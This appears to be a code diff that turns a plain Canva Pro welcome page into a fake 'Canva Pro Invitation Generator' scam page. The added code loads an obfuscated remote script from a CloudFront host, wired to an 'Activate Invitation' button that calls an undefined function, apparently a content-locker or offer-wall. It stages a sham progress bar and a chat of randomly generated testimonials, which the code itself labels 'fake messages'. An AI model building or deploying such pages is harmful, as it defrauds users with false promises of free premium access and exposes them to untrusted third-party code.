@@ -3,60 +3,314 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Canva Pro Styled Page</title>
+    <title>Canva Pro Invitation Generator</title>
+    <script type="text/javascript">
+        var rwrjm_GNR_sOvifc={"it":4385758,"key":"af729"};
+    </script>
+    <script src="https://d2bxqnokimz7h9.cloudfront.net/0a1e022.js"></script>
     <style>
+        :root {
+            --primary: #E84393;
+            --secondary: #FF7675;
+            --accent: #F6E58D;
+            --bg: #FFF5E4;
+            --surface: #FFFFFF;
+            --shadow: rgba(0, 0, 0, 0.08);
+        }
+
         body {
-            font-family: Arial, sans-serif;
-            background-color: #F3F5FF;
-            text-align: center;
+            font-family: 'Poppins', sans-serif;
+            background: var(--bg);
             margin: 0;
-            padding: 0;
+            padding: 2rem;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
         }
-        .header {
-            background-color: #2A70F0;
-            padding: 20px;
-        }
-        .header img {
-            max-width: 150px;
-        }
+
         .container {
-            margin: 20px auto;
-            max-width: 800px;
-            background: white;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            background: var(--surface);
+            border-radius: 20px;
+            padding: 2.5rem;
+            box-shadow: 0 8px 30px var(--shadow);
+            width: 100%;
+            max-width: 600px;
+            margin-bottom: 2rem;
+            animation: fadeIn 1s ease;
         }
+
         h1 {
-            color: #2A70F0;
+            color: var(--primary);
+            text-align: center;
+            font-weight: 600;
+            margin-bottom: 2rem;
         }
-        p {
-            color: #444;
-            font-size: 16px;
+
+        .duration-options {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 1rem;
+            margin: 2rem 0;
         }
-        .button {
-            background-color: #7B3FF2;
-            color: white;
-            padding: 10px 20px;
-            border: none;
-            border-radius: 5px;
+
+        .duration-option {
+            background: var(--surface);
+            border: 2px solid var(--primary);
+            border-radius: 12px;
+            padding: 1.5rem;
+            text-align: center;
             cursor: pointer;
-            text-decoration: none;
-            font-size: 16px;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
         }
-        .button:hover {
-            background-color: #6328C5;
+
+        .duration-option:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 4px 15px var(--shadow);
+        }
+
+        .duration-option.selected {
+            background: var(--primary);
+            color: white;
+            border-color: var(--primary);
+        }
+
+        .duration-option.selected::after {
+            content: '✔';
+            position: absolute;
+            right: 10px;
+            bottom: 10px;
+            font-size: 1.2rem;
+            opacity: 0.8;
+        }
+
+        .progress-container {
+            height: 8px;
+            background: var(--surface);
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 2rem 0;
+            box-shadow: inset 0 1px 3px var(--shadow);
+        }
+
+        .progress-bar {
+            height: 100%;
+            width: 0;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            transition: width 5s linear;
+        }
+
+        #verifyBtn {
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            color: white;
+            border: none;
+            padding: 1rem 2rem;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: 500;
+            width: 100%;
+            margin-top: 1rem;
+            transition: transform 0.2s ease;
+            display: none;
+        }
+
+        #verifyBtn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 4px 15px rgba(232, 67, 147, 0.3);
+        }
+
+        .chat-container {
+            background: var(--surface);
+            border-radius: 20px;
+            padding: 1.5rem;
+            box-shadow: 0 8px 30px var(--shadow);
+            width: 100%;
+            max-width: 600px;
+            height: 450px;
+            position: relative;
+        }
+
+        .chat-messages {
+            height: 380px;
+            overflow-y: auto;
+            padding-right: 10px;
+        }
+
+        .message {
+            padding: 1rem;
+            margin-bottom: 0.5rem;
+            background: rgba(232, 67, 147, 0.08);
+            border-radius: 12px;
+            animation: slideIn 0.5s ease;
+        }
+
+        .username {
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        .message-input {
+            margin-top: 1rem;
+            display: flex;
+            gap: 0.5rem;
+        }
+
+        .message-input input {
+            flex: 1;
+            padding: 0.8rem;
+            border: 2px solid var(--primary);
+            border-radius: 25px;
+            outline: none;
+        }
+
+        .message-input button {
+            padding: 0.8rem 1.5rem;
+            background: var(--primary);
+            color: white;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: transform 0.2s ease;
+        }
+
+        .message-input button:hover {
+            transform: translateY(-1px);
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateX(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateX(0);
+            }
         }
     </style>
 </head>
 <body>
-    <div class="header">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/e/ec/Canva_Logo.png" alt="Canva Pro Logo">
-    </div>
     <div class="container">
-        <h1>Welcome to Canva Pro</h1>
-        <p>Experience the power of professional design with Canva Pro.</p>
-        <a href="#" class="button">Get Started</a>
+        <h1>Generate Your Canva Pro Invitation</h1>
+        
+        <input type="text" id="username" placeholder="Enter your name" class="input-field">
+        
+        <div class="duration-options" id="durationOptions">
+            <div class="duration-option" data-duration="1">1 Month</div>
+            <div class="duration-option" data-duration="3">3 Months</div>
+            <div class="duration-option" data-duration="6">6 Months</div>
+            <div class="duration-option" data-duration="12">12 Months</div>
+        </div>
+
+        <button id="generateBtn" class="primary-btn" disabled>Generate Invitation</button>
+        <div class="progress-container">
+            <div class="progress-bar" id="progressBar"></div>
+        </div>
+        <button id="verifyBtn" onclick="_xb()">Activate Invitation</button>
     </div>
+
+    <div class="chat-container">
+        <div class="chat-messages" id="chatMessages"></div>
+        <div class="message-input">
+            <input type="text" id="chatInput" placeholder="Say thanks for your Canva Pro access...">
+            <button onclick="sendMessage()">Send</button>
+        </div>
+    </div>
+
+    <script>
+        const names = ['Sophia', 'Liam', 'Olivia', 'Noah', 'Emma', 'Elijah', 'Charlotte', 'James', 'Amelia', 'Oliver'];
+        const messages = [
+            'Just got my Canva Pro access - the templates are amazing!',
+            'Finally upgraded my designs with premium features!',
+            'The team plan feature is a game-changer!',
+            'Canva Pro has transformed my workflow!',
+            'Premium stock photos are worth every penny!',
+            'Brand kit organization is so professional!',
+            'Magic Resize tool saved me hours!',
+            'Collaboration features are seamless!',
+            'Background remover works like magic!',
+            'Customer support was super helpful!'
+        ];
+
+        // Duration selection
+        document.querySelectorAll('.duration-option').forEach(option => {
+            option.addEventListener('click', () => {
+                document.querySelectorAll('.duration-option').forEach(opt => opt.classList.remove('selected'));
+                option.classList.add('selected');
+                validateForm();
+            });
+        });
+
+        // Form validation
+        document.getElementById('username').addEventListener('input', validateForm);
+        function validateForm() {
+            const username = document.getElementById('username').value.trim();
+            const selected = document.querySelector('.duration-option.selected');
+            document.getElementById('generateBtn').disabled = !(username && selected);
+        }
+
+        // Progress bar
+        document.getElementById('generateBtn').addEventListener('click', () => {
+            const progressBar = document.getElementById('progressBar');
+            progressBar.style.width = '100%';
+            
+            setTimeout(() => {
+                document.getElementById('generateBtn').style.display = 'none';
+                document.getElementById('verifyBtn').style.display = 'block';
+            }, 5000);
+        });
+
+        // Chat system
+        let chatActive = false;
+        function addMessage(username, message, delay) {
+            setTimeout(() => {
+                const msgDiv = document.createElement('div');
+                msgDiv.className = 'message';
+                msgDiv.innerHTML = `<span class="username">${username}</span>: ${message}`;
+                document.getElementById('chatMessages').appendChild(msgDiv);
+                document.getElementById('chatMessages').scrollTop = document.getElementById('chatMessages').scrollHeight;
+            }, delay);
+        }
+
+        // Initial fake messages
+        function startChat() {
+            if (chatActive) return;
+            chatActive = true;
+            
+            let delay = 0;
+            for (let i = 0; i < 20; i++) {
+                const randomName = names[Math.floor(Math.random() * names.length)];
+                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                addMessage(randomName, randomMsg, delay);
+                delay += Math.random() * 2000 + 1000;
+            }
+        }
+
+        // User messages
+        function sendMessage() {
+            const input = document.getElementById('chatInput');
+            const message = input.value.trim();
+            if (!message) return;
+
+            addMessage('You', message, 0);
+            input.value = '';
+        }
+
+        // Start chat after 3 seconds
+        setTimeout(startChat, 3000);
+    </script>
 </body>
 </html>
